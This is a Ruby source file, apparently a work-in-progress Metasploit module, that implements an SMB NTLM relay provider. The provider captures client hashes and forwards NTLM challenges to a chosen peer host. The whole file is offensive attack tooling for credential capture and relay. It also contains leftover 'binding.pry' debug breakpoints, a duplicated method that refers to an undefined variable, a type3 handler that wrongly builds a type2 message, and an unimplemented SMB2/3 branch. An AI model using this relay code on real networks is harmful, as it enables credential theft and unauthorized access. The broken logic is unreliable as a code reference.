require 'ruby_smb/ntlm'

module Msf
  module Exploit::Remote::SMB
    include ::Msf::Exploit::SMBHashCapture

    #
    # A GSS provider that authenticates clients via the passing of a hash to a specified remote host.
    #
    class RubySMBMITMProvider < ::Msf::Exploit::SMBHashCapture::HashCaptureNTLMProvider
      include RubySMB::NTLM

      def initialize(opts)
        raise ArgumentError, 'Must specify a peer_host' unless opts[:peer_host]
        raise ArgumentError, 'Must specify a peer_port' unless opts[:peer_port]
        raise ArgumentError, 'Must specify a local_host' unless opts[:local_host]
        super(allow_anonymous: opts[:allow_anonymous], default_domain: opts[:default_domain], listener: opts[:listener])

        @peer_host = opts[:peer_host]
        @peer_port = opts[:peer_port]
        @local_host = opts[:local_host]
        @timeout = opts[:timeout] ? opts[:timeout] : 3
      end

      def new_authenticator(server_client)
        # build and return an instance that can process and track stateful information for a particular connection but
        # that's backed by this particular provider
        Authenticator.new(self, server_client)
      end

      class Authenticator < ::Msf::Exploit::SMBHashCapture::HashCaptureAuthenticator
        class MITMClient < ::RubySMB::Client
          def initialize(dispatcher, smb1: true, smb2: true, smb3: true, username:, password:, domain: nil, local_workstation: nil, always_encrypt: nil, ntlm_flags: nil, provider: nil)
            super(dispatcher,
                  smb1: smb1,
                  smb2: smb2,
                  smb3: smb3,
                  username: username,
                  password: password,
                  domain: domain,
                  local_workstation: local_workstation,
                  always_encrypt: always_encrypt,
                  ntlm_flags: ntlm_flags)

            @provider = provider
          end

          def get_peer_server_challenge(type1_msg)
            @version = negotiate

            if @version == 'SMB1'
              neg_pkt = smb1_ntlmssp_negotiate_packet
              neg_pkt.set_type1_blob(type1_msg.serialize)
              resp = send_recv(neg_pkt)

              challenge_packet = smb1_ntlmssp_challenge_packet(resp)

              # Store the available OS information before going forward.
              @peer_native_os = challenge_packet.data_block.native_os.to_s
              @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s

              @user_id = challenge_packet.smb_header.uid

              type2_challenge_raw = smb1_type2_message(challenge_packet)

              type2_challenge = Net::NTLM::Message.decode64(type2_challenge_raw)

              type2_challenge.challenge
            else
              # TODO SMB2/3 lol
            end
          rescue ::Exception => e
            msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
            elog(msg, error: e)
            print_warning msg
          end
        end

        def send_auth_attempt(type3_message)



          @version = negotiate

          if @version == 'SMB1'
            neg_pkt = smb1_ntlmssp_negotiate_packet
            neg_pkt.set_type1_blob(type1_msg.serialize)
            resp = send_recv(neg_pkt)

            challenge_packet = smb1_ntlmssp_challenge_packet(resp)

            # Store the available OS information before going forward.
            @peer_native_os = challenge_packet.data_block.native_os.to_s
            @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s

            @user_id = challenge_packet.smb_header.uid

            type2_challenge_raw = smb1_type2_message(challenge_packet)

            type2_challenge = Net::NTLM::Message.decode64(type2_challenge_raw)

            type2_challenge.challenge
          else
            # TODO SMB2/3 lol
          end
        rescue ::Exception => e
          msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
          elog(msg, error: e)
          print_warning msg
        end

        def reset!
          super

          # Server that we are passing the hash to
          @server_connection = nil
        end

        #
        # Process the NTLM type 1 message and build a type 2 response message.
        #
        # @param [Net::NTLM::Message::Type1] type1_msg the NTLM type 1 message received by the client that should be
        #   processed
        # @return [Net::NTLM::Message::Type2] the NTLM type 2 response message with which to reply to the client
        def process_ntlm_type1(type1_msg)
          require 'pry'
          binding.pry


          @server_connection = create_mitm_client(@provider.peer_host, @provider.peer_port,
                                                 @provider.local_host, @provider.timeout)
          srv_chall = @server_connection.get_peer_server_challenge(type1_msg)

          type2_msg = super

          @server_challenge = [srv_chall].pack('Q<')
          type2_msg.challenge = srv_chall

          type2_msg
        end

        #
        # Process the NTLM type 3 message and either accept or reject the authentication attempt.
        #
        # @param [Net::NTLM::Message::Type3] type3_msg the NTLM type 3 message received by the client that should be
        #   processed
        # @return [WindowsError::ErrorCode] an NT Status error code representing the operations outcome where
        #   STATUS_SUCCESS is a successful authentication attempt and anything else is a failure
        def process_ntlm_type3(type3_msg)
          # captures hash
          super









          @server_connection = create_mitm_client(@provider.peer_host, @provider.peer_port,
                                                  @provider.local_host, @provider.timeout)
          require 'pry'
          binding.pry

          srv_chall = get_peer_server_challenge(@server_connection, type1_msg)

          type2_msg = super
          type2_msg.challenge = srv_chall

          type2_msg
        end

        def create_mitm_client(peer_host, peer_port, local_host, timeout)
          sock = Rex::Socket::Tcp.create(
            'LocalHost' => local_host,
            'PeerHost' => peer_host,
            'PeerPort' => peer_port,
            'Server' => false,
            'Timeout' => timeout,
            'Context' =>
              {
                'Caller' => self
              }
          )

          dispatcher = RubySMB::Dispatcher::Socket.new(sock)
          client = MITMClient.new(dispatcher, provider: self, username: '', password: '',
                                  smb1: true, smb2: false, smb3: false)

          client
        rescue ::Exception => e
          msg = "Unable to create connection to server #{peer_host}:#{peer_port} on local interface #{local_host}."
          elog(msg, error: e)
          print_warning msg
        end

      end

      attr_reader :peer_host, :peer_port, :local_host, :timeout
    end
  end
end
